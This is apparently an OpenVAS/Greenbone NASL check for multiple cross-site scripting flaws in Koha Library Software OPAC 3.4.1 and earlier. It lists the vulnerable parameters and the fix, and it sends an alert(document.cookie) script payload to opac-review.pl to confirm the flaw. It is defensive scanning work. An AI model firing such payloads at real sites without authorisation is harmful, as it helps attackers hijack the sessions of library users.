if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902640" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_bugtraq_id( 48895 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-11-30 11:26:06 +0530 (Wed, 30 Nov 2011)" );
	script_name( "Koha Library Software OPAC Multiple Cross Site Scripting Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/45435/" );
	script_xref( name: "URL", value: "http://koha-community.org/koha-3-4-2/" );
	script_xref( name: "URL", value: "http://en.securitylab.ru/lab/PT-2011-05" );
	script_xref( name: "URL", value: "http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=6518" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/103440/PT-2011-05.txt" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "Koha Library Software versions 3.4.1 and prior." );
	script_tag( name: "insight", value: "The flaws are due to improper validation of user-supplied input in
  'bib_list' parameter to opac-downloadcart.pl, 'biblionumber' parameter to
  opac-serial-issues.pl, opac-addbybiblionumber.pl, opac-review.pl and
  'shelfid' parameter to opac-sendshelf.pl and opac-downloadshelf.pl." );
	script_tag( name: "solution", value: "Upgrade to Koha Library Software version 3.4.2 or later." );
	script_tag( name: "summary", value: "The host is running Koha Library Software and is prone to multiple
  cross-site scripting vulnerabilities." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
for dir in nasl_make_list_unique( "/", "/koha", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: dir + "/opac-main.pl", port: port );
	if(ContainsString( res, "koha" ) && ContainsString( res, "Library" )){
		url = NASLString( dir, "/koha/opac-review.pl?biblionumber=\"<script>alert" + "(document.cookie)</script>" );
		if(http_vuln_check( port: port, url: url, pattern: "<script>alert" + "\\(document.cookie\\)</script>", check_header: TRUE )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

